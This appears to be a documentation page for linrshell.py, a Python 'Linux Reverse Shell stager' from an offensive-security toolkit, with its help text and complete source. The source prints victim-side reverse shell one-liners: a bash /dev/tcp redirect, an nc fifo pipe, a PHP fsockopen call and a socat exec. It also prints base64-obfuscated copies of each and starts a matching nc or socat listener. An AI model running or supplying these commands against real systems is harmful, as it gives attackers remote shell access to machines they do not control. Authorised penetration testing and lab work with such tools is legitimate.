---
description: Linux Reverse Shell stager.
geekdocAlign: left
geekdocDescription: Linux Reverse Shell stager.
title: linrshell.py
weight: 10

---

> **Linux Reverse Shell stager.**

{{< tabs "6d412b22cf1df06e0312f6c5730d31d1" >}}
{{< tab "Screencast" >}}
<div class="video-container">
<video controls autoplay="true" loop="true">
<source src="/cli/linrshell.py.webm" type="video/webm">
</video>
</div>
{{< /tab >}}
{{< tab "Help" >}}

```bash
usage: linrshell.py [-h] [--interface INTERFACE] [--ipv {4,6}] [-p PORT] [--rshell RSHELL] [--list]

Linux Reverse Shell stager.

optional arguments:
  -h, --help            show this help message and exit
  --interface INTERFACE, -i INTERFACE
                        network interface: i.e. tun0, eth0, if undefined, an fzf prompt will appear
  --ipv {4,6}           IP Version
  -p PORT, --port PORT  Directory or file path.
  --rshell RSHELL, -s RSHELL
                        Reverse shell type nc,socat
  --list, -l            List reverse shell types
```

{{< /tab >}}
{{< tab "Source" >}}

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Linux Reverse Shell stager."""
import argparse
from v0tools.lib import util
from v0tools import ansi, syspkgs, cli
from base64 import b64encode
from pyfzf.pyfzf import FzfPrompt
import os


def _socat(args):
    """Raw TTY socat listener

    Runs: socat file:`tty`,raw,echo=0 tcp-listen:{args.port}
    """
    remote_commands = [
        f"socat exec:'__SH__ -i',pty,stderr,setsid,sigint,sane tcp:{args.address}:{args.port}",
    ]
    lcmd = f"socat file:`tty`,raw,echo=0 tcp-listen:{args.port}"
    _print_remote(remote_commands)
    _print_local(lcmd)
    os.system(lcmd)


def _nc(args):
    """Netcat Listener

    Runs: nc -nklv {args.address} {args.port}"
    """
    lcmd = f"nc -nklv {args.address} {args.port}"
    remote_commands = [
        f"__SH__ -i >& /dev/tcp/{args.address}/{args.port} 0>&1",
        f"mkfifo /tmp/{args.rstr};cat /tmp/{args.rstr}|__SH__ -i 2>&1|nc {args.address} {args.port} /tmp/{args.rstr}",
        f'php -r \'$sock=fsockopen("{args.address}",{args.port});exec("__SH__ -i <&3 >&3 2>&3");\'',
    ]
    _print_remote(remote_commands)
    _print_local(lcmd)
    os.system(lcmd)


SH_MAP = {
    "nc": _nc,
    "socat": _socat,
}

cli = cli.Cli()

parser = cli.parser
cli.add_ipv_interface()
cli.add_port()

parser.add_argument(
    "--rshell",
    "-s",
    help=f"Reverse shell type {','.join(SH_MAP.keys())}",
    type=str,
)

parser.add_argument(
    "--list",
    "-l",
    help="List reverse shell types",
    action="store_true",
    default=False,
)


def _print_remote(remote_commands):
    print(ansi.banner("Victim Commands:"))
    for sh in ["sh", "bash"]:
        print(ansi.section(sh))
        for i in remote_commands:
            sval = f"{i}".replace("__SH__", sh)
            print(f"{sval} &")
            print(f"echo {b64encode(sval.encode()).decode()} | base64 -d | {sh} &")
            print()


def _print_local(lcmd):
    print(ansi.banner("Victim staging copy pasta:"))
    print(util.rshell_stagetxt())
    print(ansi.banner(f"Starting listener: {lcmd}"))


def main(args):
    """Run main function."""
    SH_MAP[args.rshell](args)


if __name__ == "__main__":
    args = cli.get_parse()
    syspkgs.check_installs(["nc", "socat"])
    # args = parser.parse_args(["-l"])
    # args = parser.parse_args(["-i", "tun0", "-p", "36185"])
    if args.list:
        for k, func in SH_MAP.items():
            print(f"{k}:")
            for line in func.__doc__.split("\n"):
                print(f"\t{line.strip()}")
        raise SystemExit()
    args.rstr = util.randstr()
    args.fzf = FzfPrompt()
    if not args.rshell:
        args.rshell = args.fzf.prompt(SH_MAP.keys())[0]
    main(args)

```

{{< /tab >}}
{{< /tabs >}}
